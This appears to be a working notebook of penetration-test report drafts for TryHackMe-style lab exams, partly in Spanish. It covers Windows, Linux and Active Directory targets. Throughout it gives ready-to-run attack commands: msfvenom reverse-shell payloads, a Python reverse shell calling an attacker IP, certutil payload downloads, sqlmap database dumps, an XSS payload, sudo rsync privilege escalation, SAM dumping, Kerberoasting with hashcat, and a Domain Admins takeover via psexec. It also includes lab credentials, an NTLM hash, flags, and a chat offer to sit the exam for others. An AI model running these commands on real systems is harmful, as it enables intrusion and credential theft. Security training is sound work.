Informe de Pruebas de Penetración: Escalada de Privilegios y Acceso Inicial
Resumen del Informe
Resumen Ejecutivo

La prueba de penetración se realizó en un equipo con Windows con el objetivo de evaluar su seguridad e identificar vulnerabilidades que un atacante podría aprovechar para obtener acceso no autorizado. El alcance de la evaluación se centró en probar puntos de entrada al sistema, explorar posibles métodos de escalada de privilegios e identificar cualquier debilidad de seguridad que pudiera conducir a accesos no autorizados o manipulación del sistema.

Durante la prueba, se identificaron vulnerabilidades críticas que permitieron el acceso inicial, seguido de la escalada de privilegios, y finalmente el acceso a nivel de SISTEMA. Estos hallazgos representan riesgos significativos para la organización, incluyendo la posibilidad de que actores maliciosos obtengan el control total de sistemas y datos confidenciales.

Hallazgos Clave:

Carga de Archivos Sin Restricciones: Se detectó que una aplicación en el sistema objetivo permitía la carga de archivos sin restricciones, lo que permitía cargar y ejecutar archivos maliciosos.

Configuración insegura del registro: La opción "AlwaysInstallElevated" del registro de Windows permitía que los archivos MSI se ejecutaran con privilegios elevados, lo que permitía a los atacantes eludir las restricciones de usuario y ejecutar código arbitrario como administrador.

La combinación de estas vulnerabilidades nos permitió obtener acceso inicial al sistema, ejecutar un shell inverso y escalar privilegios a nivel de SISTEMA. Se recomienda actuar de inmediato para remediar estas vulnerabilidades y evitar el acceso no autorizado.

Hallazgos y recomendaciones

Carga de archivos sin restricciones (Aplicación personalizada)

Nivel de riesgo: Alto

    Impacto: Los atacantes pueden cargar y ejecutar código arbitrario, lo que podría comprometer el sistema.

Recomendación: Implementar una validación y desinfección de archivos adecuadas en el mecanismo de carga de archivos. Limitar los tipos de archivos permitidos y garantizar que las cargas de los usuarios no puedan ejecutar código arbitrario.

Configuración de Registro Insegura (AlwaysInstallElevated)

Nivel de Riesgo: Crítico

    Impacto: Los atacantes pueden crear y ejecutar archivos MSI maliciosos con privilegios elevados, lo que puede comprometer por completo el sistema.

Recomendación: Desactive la opción "AlwaysInstallElevated" en el registro de Windows. Asegúrese de que solo usuarios y procesos de confianza puedan instalar software o ejecutar archivos MSI con privilegios elevados.

Escalada de Privilegios mediante MSI (Configuración de Registro Insegura)

Nivel de Riesgo: Crítico

    Impacto: Los atacantes pueden obtener acceso administrativo o de nivel SISTEMA al equipo.

Recomendación: Revise y actualice la configuración del sistema para asegurarse de que la opción "AlwaysInstallElevated" esté deshabilitada y restrinja el acceso a las claves de registro que la rigen.

Permisos de Directorios Mal Configurados

Nivel de Riesgo: Medio

    Impacto: Los permisos de archivo inseguros pueden permitir a los atacantes leer, escribir o ejecutar archivos confidenciales.

Recomendación: Auditar periódicamente los permisos de directorios y archivos, especialmente en directorios críticos para el sistema como C:\Archivos de programa y C:\Windows. Asegurarse de que solo los usuarios autorizados tengan permisos de escritura o ejecución.

Descripción de vulnerabilidades


-----------------------------------------------------------------------------------------------------------------------------------------------

Vulnerabilidad 1: Carga de archivos sin restricciones

Calificación de riesgo: Alta
Valor de la bandera: THM{884a8fcd-7d9d-429c-97c2-a456c304206e}

Descripción:

    Se identificó una vulnerabilidad de carga de archivos sin restricciones en una aplicación personalizada alojada en el sistema objetivo (https://10.200.150.151/). La aplicación permite a los usuarios cargar archivos sin validar los tipos de archivo, lo que permite la carga de archivos arbitrarios (incluido código ejecutable). Esto se explota comúnmente para cargar scripts maliciosos, como shells inversos, que pueden ejecutarse en el servidor al acceder a ellos.

    La vulnerabilidad se descubrió al cargar una carga útil manipulada (es decir, msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.250.1.6 LPORT=1234 -f exe -o 1234.exe.pdf) y escuchar en una sesión netcat (nc -lvnp 1234).

        Impacto:
    Un atacante podría cargar un archivo malicioso y ejecutar código arbitrario en el servidor, lo que podría comprometer el sistema y obtener acceso a información confidencial. Si no se detecta, esta vulnerabilidad podría comprometer completamente el sistema.

    Recomendaciones de solución:

    Implemente una validación y desinfección de entrada adecuadas para los archivos cargados. Permita únicamente tipos de archivo conocidos y seguros (por ejemplo, imágenes o PDF).

    Utilice una lista blanca de tipos de archivo y realice comprobaciones del lado del servidor para garantizar que los archivos cargados no sean ejecutables.

    Asegúrese de que los archivos cargados se almacenen en directorios no ejecutables para evitar su ejecución automática.




Vulnerabilidad 2: Configuración de registro insegura (AlwaysInstallElevated)

Calificación de riesgo: Crítico
Valor de la bandera: THM{6e9a8f94-7e2a-4aa0-adb9-1eaa3e687749}

Descripción:

Se detectó que la configuración de registro AlwaysInstallElevated en Windows estaba habilitada tanto en el registro HKCU (Usuario actual) como en el HKLM (Máquina local). Esto permite que los archivos de instalación MSI se ejecuten con privilegios elevados, independientemente del usuario que los ejecute. Esta configuración incorrecta podría permitir a atacantes con acceso de bajo nivel crear archivos MSI maliciosos y ejecutarlos con privilegios de sistema.

La vulnerabilidad se identificó consultando los valores de registro con el comando reg query, lo que confirmó que la configuración AlwaysInstallElevated estaba establecida en 1 en ambas ubicaciones.

    Impacto:

Un atacante podría explotar esta vulnerabilidad creando un archivo MSI malicioso (p. ej., msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.250.1.6 LPORT=8888 -f msi -o shell.msi) y ejecutándolo para escalar privilegios y obtener acceso a nivel de SISTEMA.

Recomendación de solución:

Desactive la opción AlwaysInstallElevated estableciendo el valor a 0 en HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer y HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer.

Audite periódicamente la configuración del registro y asegúrese de que no haya ninguna configuración insegura habilitada.

Restringa el acceso a la configuración del registro a usuarios no administradores para evitar su manipulación.





Vulnerabilidad 3: Escalada de privilegios mediante un archivo MSI malicioso

Calificación de riesgo: Crítico

Descripción:

Tras confirmar la presencia de la configuración de registro AlwaysInstallElevated, pudimos crear un archivo MSI malicioso mediante msfvenom para iniciar un shell inverso con privilegios de SISTEMA. El shell inverso se ejecutó correctamente tras ejecutar el archivo MSI en el equipo objetivo mediante el comando msiexec (msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi).

    Impacto:

Esta vulnerabilidad permite a un atacante eludir las restricciones de usuario y ejecutar código arbitrario con privilegios elevados, lo que permite el acceso a nivel de SISTEMA. Esto podría utilizarse para exfiltrar datos confidenciales, implementar malware o comprometer aún más el sistema.

Consejos de solución:

Desactive la configuración de registro AlwaysInstallElevated como se describe en la vulnerabilidad 2.

Implemente un control de acceso con privilegios mínimos para los usuarios, garantizando que solo los administradores de confianza puedan ejecutar archivos MSI con privilegios elevados.

Audite y supervise periódicamente la ejecución de archivos MSI, especialmente en entornos de producción.




Vulnerabilidad 4: Permisos mal configurados en directorios

Calificación de riesgo: Media

Descripción:

Se encontraron permisos de archivos y directorios mal configurados en varios directorios críticos, incluyendo C:\Users\hr\Documents. Atacantes o usuarios no autorizados podrían haber accedido a archivos confidenciales, como user.txt (el indicador de privilegios bajos).

    Impacto:

Los permisos incorrectos podrían permitir a los atacantes leer, modificar o eliminar archivos confidenciales, lo que podría exponer las credenciales de usuario o datos confidenciales. Esto podría facilitar los ataques de escalada de privilegios o el robo de datos.

Consejos de remediación:

Implemente el principio de mínimo privilegio restringiendo el acceso a directorios y archivos sensibles.

Asegúrese de que solo los usuarios y administradores autorizados tengan acceso a los archivos y directorios críticos.

Audite periódicamente los permisos de directorios y archivos para garantizar que estén configurados correctamente.

Conclusión

Esta prueba de penetración reveló vulnerabilidades críticas que expusieron el sistema a accesos no autorizados y escalada de privilegios. Es necesario remediar de inmediato los problemas identificados, en particular la configuración incorrecta del registro AlwaysInstallElevated y la vulnerabilidad de carga de archivos sin restricciones, para mitigar el riesgo de explotación. Al abordar estas vulnerabilidades, la organización puede mejorar significativamente su seguridad y reducir la probabilidad de un ataque exitoso.







-------------------------------------------------------------------------------------------------------------------





Summary
Multiple critical vulnerabilities were discovered in the TryBankMe application hosted at 10.200.150.100. The results demonstrate flaws in input validation. These vulnerabilities can be combined to gain unauthorized access, escalate privileges, extract sensitive data, and compromise core banking operations.

Scope

The scope of this assessment includes the web application and APIs exposed at:

http://10.200.150.100/ (front-end web application)

http://10.200.150.100:8080/api/v1.0/ (back-end API endpoints)

The following attack vectors were successfully tested:

Cross-Site Scripting (XSS): An injection at http://10.200.150.100/loans/create allowed the execution of arbitrary scripts.

Faulty business logic: Unauthorized loan modifications were allowed via http://10.200.150.100/api/v1.0/loan.

Faulty access control: Users could escalate privileges by modifying their role via http://10.200.150.100/api/v1.0/user.

SQL injection: Exploitation of the /api/v1.0/user POST endpoint allowed database enumeration and exfiltration of sensitive data.

Impact

The identified vulnerabilities have serious implications.

Critical: Remote code execution, financial fraud, and massive data breach.

Operational and legal risk: Full system compromise and regulatory penalties.

Conclusion

The assessment highlights fundamental security weaknesses in the application architecture. Lack of proper input validation, access control mechanisms, and secure coding practices expose the platform to exploitation.msfvenom


-------------------------------------------------------------------------------------------------------------------

reg save hklm\\SYSTEM C:\\Users\\john\\Documents\\system.bak
reg save hklm\\SAM C:\\Users\\john\\Documents\\sam.bak





sqlmap -u "http://10.200.150.100:8080/api/v1.0/auth" --data='{"username":"admin","password":"admin"}' --headers="Content-Type: application/json" --method=POST --ignore-code=401 -D trybankmedbs --tables --dump

curl -H 'Content-Type: application/json' -X POST -d '{"Username" , "target51" , "pass" , "1234567890"}' http://10.200.150.100:8080/api/v1.0/xss
{"message":"Server error: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand."}


Database: sequel
Table: user
[1 entry]
+----+------------------+---------------------+------------------------------------------+
| id | email            | created             | password                                 |
+----+------------------+---------------------+------------------------------------------+
| 1  | admin@sequel.thm | 2025-02-21 09:05:46 | zxQY7tN1iUz9EJ3l8zWezxQY7tN1iUz9EJ3l8zWe |
+----+------------------+---------------------+---------------------





sqlmap -u "http://10.200.150.100:8080/api/v1.0/auth" --data='{"username":"super","password":"Super@123"}' -H "Content-Type: application/json" --method=POST --ignore-code=401 -D trybankmedbs --tables --dump --batch


sqlmap -u "http://10.200.150.100:8080/api/v1.0/auth" --data='{"username":"super*","password":"Super@123"}' -H "Content-Type: application/json" --method=POST --dbs --batch



    sqlmap -u "http://10.200.150.100:8080/api/v1.0/auth" --data='{"username":"admin","password":"admin"}' --header="Content-Type:application/json" --method=POST --ignore-code=401 --dump-all





sqlmap -u "http://10.200.150.100:8080/api/v1.0/auth" --data='{"username":"admin","password":"admin"}' --header='Content-Type: application/json' --method=POST --batch -T Flags -D trybankmedbs  --ignore-code=401





sqlmap -u "http://10.200.150.100:8080/api/v1.0/auth" --data='{"username":"admin","password":"admin"}' --header="Content-Type: application/json" --method=POST --ignore-code=401 -D trybankmedbs -T Flags --dump





### Ejemplos
└─$ sqlmap -u "http://127.0.0.1:8000/login1.php?msg=1" --method=POST --data="uid=admin&password=root" --dbms=mysql --batch -D sqlitraining --tables



sqlmap -u "http://127.0.0.1:8000/login1.php?msg=1" --method=POST --data="uid=admin&password=root" --dbms=mysql --batch -D sqlitraining -T users -C username,password --dump


sqlmap -u "http://localhost/computer_parts/register.php" \
--method=POST \
--data="first_name=Test&last_name=User&email=test2@example.com&password=abc123" \
--dbms=mysql --batch \
--output-dir=~/Desktop/sqlmap_project/register


-------------------------------------------------------------------------------------------------------------------------

John Doe, [15/8/2025 4:14]
¿Alguien quiere que le haga el examen? ¡Por favor, envíenme un mensaje directo!
La oferta es para todo el examen y también por bandera.
Para obtener orientación, no duden en contactarme también por mensaje directo.
He aprobado este examen tres veces en diferentes equipos, así que puedo ayudar.

John Doe, [15/8/2025 4:19]
Para la web:
Recomiendo empezar de una forma que no sea demasiado compleja; de lo contrario, se cansará fácilmente.
Primero, cree una cuenta y capture todos sus datos.

Como el número de cuenta, el número de tarjeta, el número de transacción, el número de bóveda, el número de préstamo, etc.

Pruebe XSS, SQLi, cambie el rol, cambie el importe de la transacción a -ve o 0.5, suba archivos a la bóveda y algunas cosas más. Luego, cree otra cuenta de usuario e intente acceder a todos los datos de las otras cuentas, como los errores de IDOR. Esto debería generar al menos dos o tres indicadores.

John Doe, [15/8/2025 4:24]
Durante la actualización del rol, asegúrese de realizar una solicitud PUT en lugar de POST o GET.









root@kali :~#, [15/8/2025 9:26]
i tried to create multiple account , send repeater multiple request (group)

root@kali :~#, [15/8/2025 9:26]
IT WORKED







-------------------------------------------------------------------------


mkdir C:\Tools



certutil -urlcache -f http://10.250.1.6:8000/PrintSpoofer64.exe C:\Windows\Temp\PrintSpoofer64.exe








login1.php?msg=1










===============================================================================







Summary Please provide a detailed summary containing the information for this 4 topics as specified in the RoE: Overview, Scope, Impact, Conclusion. 



1. XSS



Affected route: http://10.200.150.100/loans/create
The following payload was injected:
<img src=x onerror=(document.cookie='XSS=XSS')>
The vulnerability was leveraged to send a malicious request to the internal API:
curl -H 'Content-Type: application/json' -X POST  -d '{ "username":"attacker", "password":"attacker" }'  http://10.200.150.100:8080/api/v1.0/xss

Implement strict input validation and sanitization on the server side. Escape output properly to prevent code execution.



2. Broken Business Logic

Route: http://10.200.150.100/api/v1.0/loan
Issue: Loans can be modified after creation without proper authorization.

Exploit Example:
PUT /api/v1.0/loan?loan_number=5abe512f-76aa-40d0-a788-a8905c560784 HTTP/1.1
{"approved":1,"loan_number":"5abe512f-76aa-40d0-a788-a8905c560784"}

Only authorized roles  should be able to approve or modify loan records.


3. Broken Access Control

Route: http://10.200.150.100/api/v1.0/user
Issue: A user can change their own role via the API and gain higher privileges.
Exploit Example:
PUT /api/v1.0/user
{
  "firstname":"test",
  "lastname":"test",
  "email":"test@test.com",
  "role":1
}

Unauthorized privilege escalation, allowing normal users to obtain admin-level access and perform restricted actions.

Prevent users from modifying their own roles or privilege levels.

4. SQL Injection









Route:
POST /api/v1.0/user HTTP/1.1

Host: 10.200.150.100:8080

Content-Type: application/json



{

  "firstname": "mr",

  "lastname": "meow",

  "username": "admin123",

  "email": "meow@gmail.com",

  "password": "admin123"

}



Attack performed using sqlmap:

sqlmap -r login.txt -p username --batch --dbms=mysql -D trybankmedbs -T Flags --dump --ignore-code=401


Exploitation results:

available databases [3]:
[*] information_schema
[*] performance_schema
[*] trybankmedbs

Tables in trybankmedbs:
+-------+
| Flags |
| Users |
+-------+
Impact:

Access sensitive user information (credentials, personal data).
Exfiltrate confidential data from the database.


sanitize any input containing special characters that could be interpreted as SQL commands






















======================
The open ports on the target host were identified: 22 (SSH) and 80 (HTTP).

The /docs#/ path, which exposes the FastAPI API documentation, was detected, including all endpoints.

A POST request was sent to the /api/tools endpoint, injecting malicious Python code to establish a reverse shell to the attacker.

{
  "content": "import socket,os,pty;s=socket.socket();s.connect((\"10.250.1.6\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")",
  "filename": "pwn.py",
  "dependencies": []
}

Successful shell execution allowed access to the user scott.

Listing the user scott's files revealed the id_rsa private key.

Using the id_rsa private key, the user successfully logged in via SSH:

ssh -i id_rsa scott@10.200.150.152

This access confirms full exploitation of the vulnerability and allows remote control over the host.


Prevent the application from allowing direct execution of system scripts or commands.
Avoid storing private keys (id_rsa) or sensitive credentials in directories accessible to the application or standard users.

















Log in as user scott.
Check his privileges with:

sudo -l
Matching Defaults entries for scott on lin3:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User scott may run the following commands on lin3:
(ALL) NOPASSWD: /usr/bin/rsync

This means he can run rsync as sudo without a password.

The following command was run to escalate privileges.

sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null

This gives us a shell with root access.
# whoami
root
List the flag with:
cat /root/root.txt



======================================================================================================================================================


Summary Please provide a detailed summary containing the information for this 4 topics as specified in the RoE: Overview, Scope, Impact, Conclusion. 




- Breach: Unrestricted File Upload (Custom App)

Se identificó una vulnerabilidad de carga de archivos sin restricciones en una aplicación personalizada alojada en el sistema objetivo (https://10.200.150.151/). La aplicación permite a los usuarios cargar archivos sin validar los tipos de archivo, lo que permite la carga de archivos arbitrarios (incluido código ejecutable).

La vulnerabilidad se descubrió al cargar una carga útil manipulada (es decir, msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.250.1.6 LPORT=1234 -f exe -o 1234.exe.pdf) y escuchar en una sesión netcat (nc -lvnp 1234).

Impacto:
Un atacante podría cargar un archivo malicioso y ejecutar código arbitrario en el servidor, lo que podría comprometer el sistema y obtener acceso a información confidencial. Si no se detecta, esta vulnerabilidad podría comprometer completamente el sistema.

Recomendaciones de solución:
Implemente una validación y desinfección de entrada adecuadas para los archivos cargados. Permita únicamente tipos de archivo conocidos y seguros (por ejemplo, imágenes o PDF).
Utilice una lista blanca de tipos de archivo y realice comprobaciones del lado del servidor para garantizar que los archivos cargados no sean ejecutables.
Asegúrese de que los archivos cargados se almacenen en directorios no ejecutables para evitar su ejecución automática.



- Command Injection (Custom App)


La vulnerabilidad de Command Injection ocurre cuando una aplicación web o software no valida adecuadamente la entrada del usuario y permite que un atacante inserte comandos del sistema operativo dentro de una función vulnerable.

La vulnerabilidad se descubrió al cargar una carga útil manipulada en la cual se pudo obtener uns shell
{
 "content": "import socket,os,pty;s=socket.socket();s.connect((\"10.250.1.6\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")",
"filename": "pwn.py",
"dependencies": []
}

Impacto:

El atacante puede ejecutar remota de código (RCE) → el atacante puede ejecutar cualquier comando en el servidor.

Recomendaciones de solución:
Evite que la aplicación permita la ejecución directa de scripts o comandos del sistema. 
Los usuario que tengan menos privilegio en la aplicación y el servidor.




- Insecure Sudo/SUID Configuration

La vulnerabilidad ocurre cuando un sistema tiene configurados de manera insegura permisos de sudo o archivos binarios con el bit SUID activado.
Esto permite que un usuario con bajos privilegios ejecute comandos con permisos elevados (root) sin la debida restricción, llevando a una escalada de privilegios.


Como por ejemplo se puede ejecutar binarios con acceso root

    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
User scott may run the following commands on lin3:
    (ALL) NOPASSWD: /usr/bin/rsync
Impacto:

Escalamiento de privilegios: un usuario sin permisos administrativos puede obtener acceso de root.

Ejecución de código malicioso con permisos de administrador.
sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null

Recomendaciones de solución:
Revisar permisos de sudoers
Usar visudo para asegurarse de que solo usuarios autorizados tengan privilegios de sudo.
Evitar configuraciones como ALL=(ALL) NOPASSWD: ALL.






- Insecure Crontab/Service/Scheduled Task Configuration

Esta vulnerabilidad se aprovecha de una tarea programada mal configurada que corre con privilegios elevados (SYSTEM).
El atacante reemplaza el ejecutable legítimo (backup.exe) por uno malicioso (reverse shell) y fuerza la ejecución de la tarea para escalar privilegios.
Después, se apoya en privilegios adicionales (SeImpersonatePrivilege) para obtener acceso como Administrador/Root.


Impacto:
El atacante logra ejecución arbitraria de código con privilegios de SYSTEM/Administrador.
Compromiso total del sistema (root access).


Recomendaciones para prevenir:
Revisar y auditar tareas programadas  evitar que ejecuten binarios que puedan ser modificados por usuarios no privilegiados.
Ejecutar servicios/tareas con la menor cantidad de privilegios posibles (principio de mínimo privilegio).




Conclusión

Esta prueba de penetración reveló vulnerabilidades críticas que expusieron el sistema a accesos no autorizados y escalada de privilegios. Es necesario remediar de inmediato los problemas identificados. la vulnerabilidad de carga de archivos sin restricciones, para mitigar el riesgo de explotación. Al abordar estas vulnerabilidades, la organización puede mejorar significativamente su seguridad y reducir la probabilidad de un ataque exitoso.












Summary
Overview

Durante la prueba de penetración se identificaron vulnerabilidades críticas en la aplicación personalizada y en la configuración de privilegios del sistema. Estas fallas permiten a un atacante cargar archivos maliciosos, inyectar comandos arbitrarios, y aprovechar configuraciones inseguras en sudo/SUID y tareas programadas, lo que expone el sistema a compromisos severos.

Scope

Las vulnerabilidades encontradas abarcan los siguientes escenarios:

Breach: Unrestricted File Upload (Custom App)
La aplicación web permite la carga de archivos sin restricciones de validación, lo que posibilita la ejecución de código arbitrario en el servidor.

Command Injection (Custom App)
Entrada de usuario no validada correctamente, permitiendo la inserción de comandos del sistema operativo y obteniendo una shell remota.

Privesc: Insecure Sudo/SUID Configuration
Configuraciones inseguras en sudoers y binarios con SUID habilitado permitieron ejecutar procesos con privilegios de root.

Privesc: Insecure Crontab/Service/Scheduled Task Configuration
Tareas programadas mal configuradas corriendo con permisos elevados fueron explotadas para reemplazar ejecutables legítimos por cargas maliciosas, obteniendo privilegios de administrador/SYSTEM.

Impact

Ejecución remota de código (RCE) en el servidor mediante carga de archivos y command injection.

Escalada de privilegios desde cuentas de usuario comunes hasta privilegios de administrador/root.

Compromiso total del sistema, con acceso completo a información sensible y posibilidad de persistencia del atacante.

De no ser corregidas, estas vulnerabilidades permiten a un atacante tomar control total del entorno afectado, comprometiendo tanto la disponibilidad como la confidencialidad de la información.

Conclusion

La prueba de seguridad confirmó que el sistema presenta vulnerabilidades de alto riesgo en validación de entradas, configuración de privilegios y tareas programadas. Estas fallas abren la puerta a compromisos críticos, incluyendo ejecución remota de código y escalamiento de privilegios.

Se recomienda:

Implementar validación estricta de entrada en aplicaciones personalizadas (listas blancas de archivos, sanitización de datos).

Auditar y restringir configuraciones de sudo/SUID y crontab/servicios siguiendo el principio de mínimo privilegio.

Establecer revisiones periódicas de seguridad para mitigar la explotación futura.

La corrección oportuna de estas vulnerabilidades reducirá de forma significativa la superficie de ataque y mejorará la postura de seguridad de la organización.













----------------------------------------------------------



Se identificó una combinación de fallas de configuración en el servicio de archivos SMB y en la gestión de credenciales que permitió el acceso no autenticado a un recurso compartido y la obtención de credenciales válidas de un usuario de dominio/local. Con dichas credenciales, fue posible establecer una sesión remota en el host a través de WinRM.

Hallazgos clave :

- Recurso SMB accesible de forma anónima (Guest/Anonymous): El recurso \\10.200.150.20\Safe permitía conexión sin autenticación.
- Exposición de secretos en un recurso compartido: En el recurso Safe se almacenaba creds.zip que contenía credenciales en texto plano (creds.txt).
- Protección débil de archivo: El ZIP estaba protegido con una contraseña fácilmente crackeable ("Passw0rd"), lo que facilitó su descifrado con diccionarios comunes.
- Reutilización/almacenamiento indebido de credenciales: El par John:VerySafePassword! del archivo fue válido para autenticación en el host.
- WinRM expuesto y utilizable por esa cuenta: Con las credenciales obtenidas fue posible abrir sesión remota PowerShell (Evil-WinRM), lo que indica permisos de administración remota o pertenencia a grupos con acceso remoto.

Impacto:
La vulnerabilidad permitió el acceso no autorizado a un recurso compartido SMB y la obtención de credenciales válidas almacenadas de manera insegura, exponiendo información sensible del host.


Enumeración:


smbclient -L //10.200.150.20/ -N
Se listó el recurso Safe. El host aceptó enumeración y acceso sin autenticación (misconfiguración #1).

Acceso anónimo al recurso y descubrimiento de archivo sensible

smbclient \\\\10.200.150.20\\Safe
smb: \> dir
...
creds.zip
smb: \> get creds.zip


El recurso contenía creds.zip con aparentes credenciales (misconfiguración #2).

Crack de contraseña débil del ZIP

zip2john creds.zip > creds.hash
john --wordlist=/usr/share/wordlists/rockyou.txt creds.hash
# Resultado: Passw0rd


Contraseña trivial y presente en diccionarios comunes (misconfiguración #3).

Extracción y exposición de credenciales en texto plano

7z x -pPassw0rd creds.zip
cat creds.txt
# John
# VerySafePassword!


Confirmación de almacenamiento inseguro de credenciales (misconfiguración #2 y #4).

Validación de credenciales y perfil del host

netexec smb 10.200.150.20 -u John -p 'VerySafePassword!'
# [+] tryhackme.loc\John:VerySafePassword!
# Windows 10 / Server 2019 Build 17763 (signing:False)


La cuenta es válida en el host y SMB signing no requerido (misconfiguración #6).

Compromiso del host mediante sesión remota PowerShell

evil-winrm -i 10.200.150.20 -u John -p VerySafePassword!


Conexión remota exitosa vía WinRM → el usuario tenía permisos para administración remota o estaba en un grupo con acceso habilitado (misconfiguración #5).



Acciones de remediación (corrección por cada misconfiguración)

Se recomienda deshabilitar el acceso anónimo a todos los recursos SMB y revisar las ACL de los shares para que solo usuarios autenticados tengan permisos mínimos necesarios, eliminar archivos que contengan credenciales y adoptar un gestor seguro de secretos, reemplazando contraseñas débiles o expuestas y habilitando políticas de complejidad y rotación periódica. Además, se debe limitar o deshabilitar WinRM donde no sea necesario, restringir el acceso remoto a usuarios autorizados, habilitar auditoría de sesiones remotas.


# Creamos un tunel con la herramienta chisel

# Se ejecuta en la maquina del atacante

- chisel server --reverse -p 4455 

# En la maquina pivoting vamos a reenviar el trafico

- evil-winrm -i 10.200.150.20 -u 'Administrator' -H 'd69046613a718ce6cc7ea9e3d5a5fcde'                      

- chisel.exe client 10.250.1.6:4455 R:socks

# Configuracion de Chisel 
- sudo nano /etc/proxychains4.conf 
            socks5 127.0.0.1 1080


# Con rpcclient vamos a listar los usuario.

- proxychains4 rpcclient -U 'John%VerySafePassword!' 10.200.150.10 

- - enumdomusers 

# Lista de Usuarios obtenidos
Administrator
Guest
m.martin
g.duncan
j.phillips


# Se realizó kerberoas y 

- proxychains4 impacket-GetUserSPNs tryhackme.loc/John:VerySafePassword! -request

# Se obtine el hash para el usuario j.phillips

$krb5tgs$23$*j.phillips$TRYHACKME.LOC$tryhackme.loc/j.phillips*$cae688bbe754e76dbc01b3934b1581e5$ef4150cb3da787af1fc09aa1060852f2e82c4870d7d30e2b2c119d3ba112c952fcc7feb96fd0a15bfc260583768aab211d9e7a99d1c9c80bd23d9f82a53a987d6b1396fcee549f03619067635f97b55126d174411cff93727f82280e1207b9733b925ac1c60606bbf90d9e99c38a0ed0ff94378cb86225774be928817a7ac3362e140a795f356e103963b67151d2ccf646fb4c461884f6024f9ffe4363bf1dd79b742611ff648eb0721cff1d9324367082f5f3c01a25fc4ebb0f052b495bbf249b63143f2b05af9ffa2626c771b298bc57392a93e2a9e95df3085d4e9c591522b4aab32b1ae9b6b8670e95c79d970cb5f91643a60f1dc7782ac2a735ddf0a95d08a43690c52345a7e0cf97c93247146a159301807903b0224b01d45d116550f54444622e7fceba2f00dfc3ef9de65c132497ee0944be7276f88c650216dd33037013191eee29a7e16afa97ee7c5f79400dc8d49b42df5d5c5f194060abe7954651e509be6bad35a4eed728867d2d126fbdc6586b5e3fcff05680104729b0c62642bb499a169ccc6e326f057aa991f1455770162405206550363a0e9e582fbd38a60e7a32134a50a3632c4755abbc76972c6914771819ca5d5951a663b5eda80b285a34725b6cb3b3f253269ab2d79a7d771b457af27de06bf77c9214138ddaa144560810f9709a2b02790156f7f959135e78812b3f6942c60bead154c5b1a3dbcc64a9a398f42c6e6b993e630eb852d573222a7fba71956be9e7a4de29b7bde39827714910359443b582c93c5d1d9110b5b2e26ca550e4b4043e4a25dba5749b85a7429800159442fd7f79804ce329623449965fdf0ece0278c5195c359e927e199981caf018701ab9a74abda0e82e9712751b26787b15e18e00e16590ae6cdb918dac617414f2f83e294508c915a7958d14ced15cbe058fb6e2712b53c17ada37e4300f8121fd220f28015cbf9145273bd296ba351dc668c28e62701fe3eb44373708a1646461b2ab873465b0e7d5b0cb9c5d8966eb28310734c1839def0023fb4c04193c2381baaca72ddddb40bd43b446552618c0d158ef807f8b14df7ebc53f7529230e85f4460b9250eb914ebbbe2024436308545b7baa5c456ec6dce51e92d0d54bcc88de6ebbbe95951ffea966b0c44b8ac0f2954c60acef01f7759d3b669efddb3e987af7de933c82157af8eebf52cf2c54ed1c08dee500f644dac2245460df94004f0b40ea1f342571e9ba6c162d9e8d3f1652689debe1383abb6ed008da7b9ab5085c35ae40114cae092ac51810ab1ba5fc3900b4fea178308d2be467a0a87e92f47




# Se obtine la constrasena con hashcat
hashcat -m 13100 -a 0 hashjphillis.txt /usr/share/wordlists/rockyou.txt 

# La constrasena obtenida para el usuario  j.phillips:Welcome1
j.phillips:Welcome1

# Se añade al usuario j.phillips al grupo “Domain Admins”.

- proxychains net rpc group addmem "Domain Admins" j.phillips -U 'dc.tryhackme.loc/j.phillips%Welcome1' -S 10.200.150.10
                                                                                                                                                                                                                                                            
# Abre una shell remota (SYSTEM) en el DC usando psexec.                                                                    
- proxychains impacket-psexec tryhackme.loc/j.phillips:'Welcome1'@10.200.150.10


# La bandera Obtenida 
C:\> type flag.txt
THM{dfc7764c-e62e-4811-a017-f65152266f47}







